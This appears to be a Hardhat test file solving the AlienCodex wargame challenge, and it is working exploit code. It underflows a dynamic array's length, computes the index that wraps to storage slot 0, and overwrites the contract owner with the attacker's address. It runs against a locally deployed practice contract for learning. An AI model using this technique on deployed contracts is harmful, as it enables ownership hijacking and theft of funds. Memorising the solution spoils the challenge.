const {
    time,
    loadFixture,
    getStorageAt
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const hre = require("hardhat");
import Web3 from "web3";

const NAME = "AlienCodex";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { owner, victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, victimContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, victimContract, attackerWallet } = await loadFixture(setup));
        })

        //exploit - every contract has storage like an array of 2**256 (indexing from 0 to 2**256 - 1) slots of 32 byte each.
        it("conduct your attack here", async function () {
                //Web3 solution

                hre.web3 = new Web3(hre.network.provider);

                await victimContract.makeContact();
                await victimContract.retract(); //make array length to max with overflow

                //take storage position of dynamic array elements (keccak256 of its slot)
                let p = hre.web3.utils.keccak256(hre.web3.eth.abi.encodeParameters(["uint256"], [1]));
                let index = BigInt(2 ** 256) - BigInt(p); //array index - last positon of contract storage + overflow by 1

                // Output: '0x000000000000000000000000<20-byte-player-address>'
                let content = '0x' + '0'.repeat(24) + attackerWallet.address.slice(2);

                // rewrite slot 0 - owner address
                await victimContract.revise(index, content); //storage space overflow..


                //Solution with contract
//                 const AttackerFactory = await ethers.getContractFactory("AlienHack");
//                 attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
//                 await attackerContract.connect(attackerWallet).exploit();
        });

        after(async function () {
            expect(await victimContract.owner()).to.be.equal(attackerWallet.address);
        });
    });
});